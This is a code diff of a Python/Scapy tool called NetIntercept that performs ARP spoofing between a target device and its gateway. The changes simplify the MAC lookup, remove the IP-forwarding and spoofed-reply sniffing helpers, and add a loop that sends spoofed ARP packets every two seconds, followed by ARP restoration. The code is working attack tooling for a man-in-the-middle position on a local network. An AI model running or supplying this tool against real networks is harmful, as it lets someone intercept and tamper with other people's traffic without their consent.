@@ -5,9 +5,6 @@ import scapy.all as scapy
 import netifaces  # Import netifaces to get default gateway
 import threading
 import time  # Import the time module
-import subprocess  # For running iptables commands
-
-from scapy.all import ARP
 
 
 class TextColors:
@@ -65,77 +62,36 @@ class NetIntercept:
         Args:
             ip_address: The IP address of the target device.
             interface: The network interface to use (optional).
-                        If None, the default interface will be used.
+                       If None, the default interface will be used.
 
         Returns:
             str: The MAC address of the target device if found, otherwise "N/A".
         """
         try:
-            if ip_address == self.get_ip_address(
-                interface
-            ):  # Check if it's the script's own IP
-                # Get MAC address directly from the interface
-                if interface is None:
-                    interface = self.interface
-                if interface:
-                    return netifaces.ifaddresses(interface)[netifaces.AF_LINK][0][
-                        "addr"
-                    ]
-                else:
-                    self.print_error("No valid network interface specified.")
-                    return "N/A"
+            arp_request = scapy.ARP(pdst=ip_address)
+            if interface is None:
+                interface = self.interface  # Use the default interface if not provided
 
+            if interface:
+                broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+                arp_request_broadcast = broadcast / arp_request
+                answered_list = scapy.srp(
+                    arp_request_broadcast,
+                    timeout=1,
+                    verbose=False,
+                    iface=interface,
+                )[0]
+
+                if answered_list:
+                    return answered_list[0][1].hwsrc
+                else:
+                    return "N/A"
             else:
-                # For other IPs, use ARP requests
-                arp_request = scapy.ARP(pdst=ip_address)
-                if interface is None:
-                    interface = (
-                        self.interface
-                    )  # Use the default interface if not provided
-
-                if interface:
-                    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-                    arp_request_broadcast = broadcast / arp_request
-                    answered_list = scapy.srp(
-                        arp_request_broadcast,
-                        timeout=1,
-                        verbose=False,
-                        iface=interface,
-                    )[0]
-
-                    if answered_list:
-                        return answered_list[0][1].hwsrc
-                    else:
-                        return "N/A"
-                else:
-                    self.print_error("No valid network interface specified.")
-                    return "N/A"
+                self.print_error("No valid network interface specified.")
+                return "N/A"
 
         except Exception as e:
             print(f"{TextColors.FAIL}Error getting MAC address: {e}{TextColors.ENDC}")
-            return "N/A"
-
-    def get_ip_address(self, interface: str = None) -> str:
-        """
-        Gets the IP address associated with a given interface.
-
-        Args:
-            interface: The network interface to use (optional).
-                        If None, the default interface will be used.
-
-        Returns:
-            str: The IP address of the interface if found, otherwise "N/A".
-        """
-        if interface is None:
-            interface = self.interface
-        if interface:
-            try:
-                return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]["addr"]
-            except (ValueError, KeyError):
-                self.print_error(f"Failed to get IP address for interface {interface}")
-                return "N/A"
-        else:
-            self.print_error("No valid network interface specified.")
             return "N/A"
 
     def spoof_arp(
@@ -177,26 +133,14 @@ class NetIntercept:
         except Exception as e:
             self.print_error(f"Error restoring ARP entry: {e}")
 
-    def _enable_ip_forwarding(self):
-        """Enables IP forwarding on the system."""
-        try:
-            subprocess.check_output(["sysctl", "-w", "net.ipv4.ip_forward=1"])
-            self.print_status("IP forwarding enabled.")
-        except Exception as e:
-            self.print_error(f"Error enabling IP forwarding: {e}")
-
-    def _disable_ip_forwarding(self):
-        """Disables IP forwarding on the system."""
-        try:
-            subprocess.check_output(["sysctl", "-w", "net.ipv4.ip_forward=0"])
-            self.print_status("IP forwarding disabled.")
-        except Exception as e:
-            self.print_error(f"Error disabling IP forwarding: {e}")
-
     def _arp_spoofing_thread(self, target_ip: str, gateway_ip: str):
-        """Continuously performs ARP spoofing and handles ARP responses."""
-        target_mac = self.get_mac(target_ip)
-        gateway_mac = self.get_mac(gateway_ip)
+        """Continuously performs ARP spoofing."""
+        target_mac = self.get_mac(
+            target_ip, self.interface
+        )  # Pass interface to get_mac
+        gateway_mac = self.get_mac(
+            gateway_ip, self.interface
+        )  # Pass interface to get_mac
 
         if target_mac == "N/A" or gateway_mac == "N/A":
             self.print_error("Failed to retrieve MAC addresses. Exiting.")
@@ -205,61 +149,26 @@ class NetIntercept:
         self.print_status(
             f"Spoofing ARP for {target_ip} ({target_mac}) to use gateway {gateway_ip} ({gateway_mac})"
         )
+        while not self.stop_event.is_set():
+            try:
+                self.spoof_arp(
+                    target_ip, gateway_ip, target_mac, self.interface
+                )  # Pass interface to spoof_arp
+                self.spoof_arp(
+                    gateway_ip, target_ip, gateway_mac, self.interface
+                )  # Pass interface to spoof_arp
+                time.sleep(2)  # Send ARP packets every 2 seconds
+            except Exception as e:
+                self.print_error(f"Error in ARP spoofing thread: {e}")
+                break  # Exit the loop if there's an error
 
-        # Create a Scapy sniff filter
-        filter_expression = (
-            f"arp and ((ether src {target_mac}) or (ether src {gateway_mac}))"
-        )
-
-        try:
-            # Enable IP forwarding
-            self._enable_ip_forwarding()
-
-            # Start sniffing for ARP requests in a separate thread
-            sniff_thread = threading.Thread(
-                target=scapy.sniff,
-                kwargs={
-                    "store": False,
-                    "prn": self._process_arp_packet,
-                    "filter": filter_expression,
-                    "iface": self.interface,
-                    "stop_filter": lambda x: self.stop_event.is_set(),
-                },
-                daemon=True,
-            )
-            sniff_thread.start()
-
-            # Main spoofing loop (send initial spoofed packets)
-            while not self.stop_event.is_set():
-                self.spoof_arp(target_ip, gateway_ip, target_mac)
-                self.spoof_arp(gateway_ip, target_ip, gateway_mac)
-                time.sleep(2)
-
-        except Exception as e:
-            self.print_error(f"Error in ARP spoofing thread: {e}")
-
-        finally:
-            # Restore ARP entries, stop sniffing, and disable IP forwarding
-            self.restore_arp(target_ip, gateway_ip, target_mac, gateway_mac)
-            self.restore_arp(gateway_ip, target_ip, gateway_mac, target_mac)
-            self.print_status(f"ARP spoofing stopped for {target_ip}")
-            self._disable_ip_forwarding()
-
-    def _process_arp_packet(self, packet):
-        """Processes sniffed ARP packets and sends spoofed responses."""
-        if packet[scapy.ARP].op == 1:  # ARP request
-            if packet[scapy.ARP].psrc == self.target_ip:
-                # Target is asking for gateway MAC
-                self.spoof_arp(self.target_ip, self.gateway_ip, packet[scapy.ARP].hwsrc)
-                print(
-                    f"{TextColors.LIGHT_GREEN}[+] Spoofed ARP Reply to Target: {self.target_ip} - MAC: {packet[scapy.ARP].hwsrc} is at {self.gateway_ip}{TextColors.ENDC}"
-                )
-            elif packet[scapy.ARP].psrc == self.gateway_ip:
-                # Gateway is asking for target MAC
-                self.spoof_arp(self.gateway_ip, self.target_ip, packet[scapy.ARP].hwsrc)
-                print(
-                    f"{TextColors.LIGHT_BLUE}[+] Spoofed ARP Reply to Gateway: {self.gateway_ip} - MAC: {packet[scapy.ARP].hwsrc} is at {self.target_ip}{TextColors.ENDC}"
-                )
+        self.restore_arp(
+            target_ip, gateway_ip, target_mac, gateway_mac, self.interface
+        )  # Pass interface to restore_arp
+        self.restore_arp(
+            gateway_ip, target_ip, gateway_mac, target_mac, self.interface
+        )  # Pass interface to restore_arp
+        self.print_status(f"ARP spoofing stopped for {target_ip}")
 
     def _parse_arguments(self):
         """
